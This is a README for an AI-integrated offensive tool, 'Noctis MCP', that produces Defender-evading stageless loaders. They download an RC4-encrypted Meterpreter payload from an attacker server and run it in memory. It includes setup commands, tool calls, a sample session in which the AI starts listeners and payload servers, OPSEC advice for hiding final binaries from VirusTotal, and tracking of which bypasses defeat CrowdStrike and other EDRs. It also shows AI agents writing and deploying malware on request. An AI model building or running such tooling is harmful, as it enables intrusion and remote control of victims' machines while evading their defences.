# NOCTIS MCP v3.0
## Automated Stageless Loader with MCP Integration

**Status:** Production Ready | **Version:** 3.0.0

---

## 🎯 What It Does

**You say (in Cursor):** "Generate stageless loader for 192.168.1.56:4444"

**System delivers:**
- ✅ Working stageless loader.exe (bypasses Defender)
- ✅ RC4-encrypted MSFVenom payload
- ✅ HTTP server ready to serve payload
- ✅ Metasploit listener ready to catch shell

### Complete Automated Workflow:

```
1. AI calls noctis_generate_stageless_loader(your_ip, port)
2. System generates MSFVenom payload
3. System encrypts with RC4 (polymorphic key)
4. System compiles clean loader (NO MSFVenom inside!)
5. System creates server/listener scripts
6. User runs loader on Windows → Gets Meterpreter shell
```

---

## 🎉 **Stageless Loader - EDR Bypass**

**How it bypasses Defender:**
- Loader binary contains **NO MSFVenom** (clean 17KB)
- Downloads encrypted payload at runtime from your HTTP server
- Decrypts in memory with RC4
- Executes stageless Meterpreter

**Key:** Defender can't detect what isn't in the file yet!

**Features:**
- ✅ Bypasses Windows Defender
- ✅ Stageless download (no MSFVenom signatures)
- ✅ RC4 encryption (new key per build)
- ✅ Fully automated via MCP tools
- ✅ Cursor AI integration

**Manual Setup:** [staged-loader/README.md](staged-loader/README.md) | [QUICKSTART](staged-loader/QUICKSTART.md)

---

## 🚀 Quick Start

### 1. Install Dependencies

```bash
# Install Python packages
pip install fastmcp flask requests

# Install MinGW (for compilation)
sudo apt install mingw-w64

# Install Metasploit (for msfvenom)
sudo apt install metasploit-framework
```

### 2. Start Server

```bash
./start_server.sh

# Or manually:
python3 server/noctis_server.py
```

Server starts on **http://localhost:8888**

### 3. Configure MCP in Cursor

Settings → Features → Model Context Protocol → Edit Config

Add this to your MCP config:

```json
{
  "mcpServers": {
    "noctis-mcp-v3": {
      "command": "python3",
      "args": ["-m", "noctis_mcp.noctis_tools"],
      "cwd": "/home/yenn/Documents/Noctis-AI/Noctis-MCP",
      "description": "Noctis Stageless Loader"
    }
  }
}
```

### 4. Use in Cursor

Just ask:
```
"Generate stageless loader for 192.168.1.56:4444"
```

AI will:
1. Call `noctis_generate_stageless_loader()`
2. Generate everything automatically
3. Give you instructions for server/listener
4. You just run the loader on Windows!

---

## 📋 MCP Tools (4 Available)

### 1. `noctis_generate_stageless_loader(lhost, lport, http_port, auto_start_servers=True)`
**Main tool - FULLY AUTOMATED! Does everything for you!**

```python
noctis_generate_stageless_loader("192.168.1.56", 4444, 8080)

# Automatically does:
# 1. Generates MSFVenom payload (stageless meterpreter)
# 2. Encrypts with RC4 (polymorphic key per build)
# 3. Compiles clean loader (NO MSFVenom!)
# 4. Starts HTTP server in background
# 5. Starts Metasploit listener in background
#
# You just:
# - Copy loader.exe to Windows VM
# - Run it
# - Get Meterpreter shell!
```

### 2. `noctis_check_status()`
**Check complete system status**

```python
noctis_check_status()

# Returns:
# - File status (which files exist, sizes)
# - Running services (HTTP server, MSF listener PIDs)
# - System readiness
```

### 3. `noctis_start_servers(lhost, lport, http_port)`
**Manually start HTTP server and MSF listener**

```python
noctis_start_servers("192.168.1.56", 4444, 8080)

# Starts:
# - HTTP server (serves payload.enc)
# - Metasploit listener (catches shells)
```

### 4. `noctis_stop_servers()`
**Stop all running servers**

```python
noctis_stop_servers()

# Stops:
# - HTTP server
# - Metasploit listener
```

---

## 💻 Complete Usage Example

### In Cursor with AI:

```
YOU: Generate stageless loader for 192.168.1.56:4444

AI: I'll generate and set up everything automatically...

[AI calls: noctis_generate_stageless_loader("192.168.1.56", 4444, 8080)]

✅ STAGELESS LOADER GENERATED!

LHOST: 192.168.1.56
LPORT: 4444
HTTP Port: 8080

Generated files:
  ✓ staged_loader.exe (17,408 bytes) - CLEAN, NO MSFVenom!
  ✓ payload.enc (203,264 bytes) - RC4 encrypted
  ✓ start_server.sh - HTTP server script
  ✓ start_listener.sh - Metasploit listener script

🚀 STARTING SERVERS AUTOMATICALLY...

✅ HTTP Server: RUNNING on port 8080
   Serving: http://localhost:8080/payload.enc
   PID: 12345

✅ Metasploit Listener: RUNNING
   Listening: 192.168.1.56:4444
   Payload: windows/x64/meterpreter_reverse_tcp
   PID: 12346

🎯 READY TO TEST!

Next steps:
  1. Copy /path/to/staged_loader.exe to Windows VM
  2. Run the loader on Windows
  3. Watch Metasploit for incoming session!

AI: Done! Everything is running. The servers are started in the background.
Just copy the loader to your Windows VM and run it!
```

---

## 🎯 How It Works

### Traditional Approach (Detected)
```
[Binary with embedded MSFVenom]
    → Defender scans
    → ❌ DETECTED (MSFVenom signatures)
```

### Stageless Loader (Bypasses Defender)
```
[Clean loader.exe (17KB, NO MSFVenom)]
    → Defender scans
    → ✅ CLEAN (no suspicious code)
    → Runs on Windows
    → Downloads payload.enc from your server
    → Decrypts with RC4 in memory
    → Executes stageless Meterpreter
    → ✅ Shell established!
```

**Key:** Defender can't detect what isn't in the file yet!

---

## 🔧 How It Works

### RAG Intelligence (Not Code Generation!)

- **RAG provides:** Technique descriptions, code snippets, OPSEC guidance
- **AI writes:** New malware code based on intelligence
- **NOT copy-paste:** AI synthesizes techniques intelligently

### Dynamic IP Handling

```python
# Works with ANY IP:
noctis_generate_beacon("sliver", "10.0.0.5", 443)    # Private
noctis_generate_beacon("sliver", "192.168.1.100", 8080)  # Local
noctis_generate_beacon("sliver", "1.2.3.4", 443)     # Public
```

### Auto-Dependency Detection

```c
// In your code:
#include "techniques/syscalls/syswhispers3.h"
#include "techniques/sleep_obfuscation/zilean.h"

// Compiler auto-detects and links:
// - techniques/syscalls/syswhispers3.c
// - techniques/sleep_obfuscation/zilean.c
```

### Learning System

Every time you test:
```python
noctis_record_result("CrowdStrike", False, "hwbp_syscalls", "Worked perfectly")
```

System updates database:
- Increases hwbp_syscalls success rate for CrowdStrike
- Recommends this combo more often
- Learns from YOUR real-world tests

---

## 📁 Project Structure

```
Noctis-MCP/
├── server/
│   ├── noctis_server.py       # Main Flask server
│   ├── edr_intel.py            # EDR intelligence database
│   ├── vt_tester.py            # VirusTotal integration
│   ├── learning_tracker.py    # SQLite learning database
│   └── rag/
│       └── rag_engine.py       # Simple RAG (file-based)
│
├── noctis_mcp/
│   └── noctis_tools.py         # 5 MCP tools
│
├── c2_adapters/
│   ├── sliver_adapter.py       # Sliver beacon generation
│   └── msfvenom_adapter.py     # Msfvenom shellcode generation
│
├── compilation/
│   └── compiler.py             # MinGW wrapper with auto-deps
│
├── techniques/                 # ✅ Existing working code
│   ├── syscalls/
│   ├── injection/
│   ├── sleep_obfuscation/
│   ├── unhooking/
│   └── ... (all existing techniques)
│
├── compiled/                   # Output binaries
├── output/                     # Shellcode output
├── data/                       # Learning database
└── logs/                       # Server logs
```

---

## ⚠️  Important Notes

### VirusTotal OPSEC

```
✅ DO: Test early prototypes on VT to iterate
❌ DON'T: Test final production binary on VT
```

**Why:** VT shares samples with AV vendors. Test prototypes, iterate, then compile final version and keep it OFF VirusTotal.

### C2 Setup

**Before generating beacons:**

1. Start Sliver server: `sliver-server`
2. Create listener: `https --lhost <IP> --lport 443`
3. Then generate beacon with that IP

**Or use msfvenom** (no server needed):

```python
noctis_generate_beacon("msfvenom", "10.0.0.5", 4444)
# Then start handler separately: msfconsole -q -x "use exploit/multi/handler"
```

---

## 🧪 Testing Workflow

### 1. Development Phase (VT Testing OK)

```python
# Generate test beacon
noctis_generate_beacon("sliver", "10.0.0.5", 443)

# AI writes test_v1.c
# Compile
noctis_compile("test_v1.c", "CrowdStrike")

# Test on VT
noctis_test_binary("compiled/test_v1.exe", "CrowdStrike")
# Result: 15% detection

# Iterate - AI improves code
# Compile test_v2.c
noctis_compile("test_v2.c", "CrowdStrike")

# Test again
noctis_test_binary("compiled/test_v2.exe", "CrowdStrike")
# Result: 5% detection, CrowdStrike CLEAN ✓
```

### 2. Production Phase (NO VT!)

```python
# Compile FINAL version
noctis_compile("final_beacon.c", "CrowdStrike")

# DO NOT TEST ON VT!

# Test in isolated environment with real CrowdStrike
# Then record result
noctis_record_result("CrowdStrike", False, "hwbp_syscalls,waiting_thread_hijacking", "Full bypass confirmed")
```

---

## 🔥 Success Metrics

**What Makes v3.0 Different:**

- ✅ **Fully Automated:** Start to finish in minutes
- ✅ **Dynamic IP:** Any IP address works
- ✅ **RAG Intelligence:** AI writes code from real implementations
- ✅ **Auto-Compilation:** Detects dependencies automatically
- ✅ **Learning System:** Gets smarter with each test
- ✅ **EDR-Specific:** Targets 10 major EDRs
- ✅ **Production Ready:** Real beacons that connect

**Not Just a Tool - It's a System:**

- User gives objective
- System generates working malware
- System compiles it
- System tests it (optional)
- System learns from results
- System gets better over time

---

## 📞 Support

- Test against your EDRs
- Record results with `noctis_record_result()`
- System learns and improves

---

## ⚖️ Legal

**For authorized red team operations only.**

Never use against systems you don't own or have written permission to test.

---

**Built by:** Noctis Team
**Version:** 3.0.0 (Clean Rebuild)
**Status:** Production Ready ✅
